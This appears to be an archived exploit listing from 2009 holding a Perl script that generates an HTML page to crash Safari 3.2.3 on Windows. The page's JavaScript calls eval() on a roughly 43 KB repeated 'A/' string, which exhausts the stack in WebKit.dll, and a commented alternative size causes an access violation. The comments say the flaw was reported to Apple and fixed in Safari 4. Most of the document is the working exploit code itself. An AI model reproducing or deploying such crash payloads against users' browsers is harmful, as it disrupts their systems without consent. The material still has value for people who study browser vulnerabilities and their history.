<html><head><title>Safari 3.2.3 (Win32) JavaScript (eval) Remote DoS Exploit</title></head><pre>#!/usr/bin/perl
# letsgosurfinnowonsafari.pl
# AKA
# Safari 3.2.3 (Win32) JavaScript 'eval' Remote Denial of Service Exploit
#
# Jeremy Brown [0xjbrown41@gmail.com//jbrownsec.blogspot.com//krakowlabs.com] 09.07.2009
#
# *********************************************************************************************************
# Safari crashes when interpreting a webpage that calls the &quot;eval&quot; JavaScript function with &quot;A/&quot; repeating
# 21526 times (43052 bytes). When triggering this vulnerability, Safari will throw a &quot;Stack Overflow&quot;
# exception, and then an access violation when adjusting the trigger to &quot;A/&quot; repeating 21697 times
# (43394 bytes). The problem originates in the module &quot;WebKit.dll&quot;. Safari uses this module as part of the
# WebKit layout engine (www.webkit.org).

# This issue was reported to Apple several months ago and it looks like they fixed it in Safari 4
# (4.1.2 tested) after recent testing. It has also been lying around the Fun Archive @ krakowlabs.com for
# quite a while too. Btw, STACK_OVERFLOW does NOT mean there is a buffer overflow on the stack. It pretty
# much means that the stack for the process has been exhausted and its maximum size has been reached.
# *********************************************************************************************************
# letsgosurfinnowonsafari.pl

$fn   = 'letsgosurfinnowwithsafari.html';
$size = 21526; # &quot;Stack Overflow&quot; WebKit.dll
#$size = 21697; # &quot;Access Violation&quot; WebKit.dll

$payload = '&lt;html&gt;&lt;script type=&quot;text/javascript&quot;&gt;' . &quot;\n&quot;;
$payload = $payload . 'eval(&quot;' . &quot;A/&quot; x $size . '&quot;);' . &quot;\n&quot;;
$payload = $payload . '&lt;/script&gt;&lt;/html&gt;';

     open(FD, '&gt;' . $fn);
     print FD $payload;
     close(FD);

# milw0rm.com [2009-09-09]</pre></html>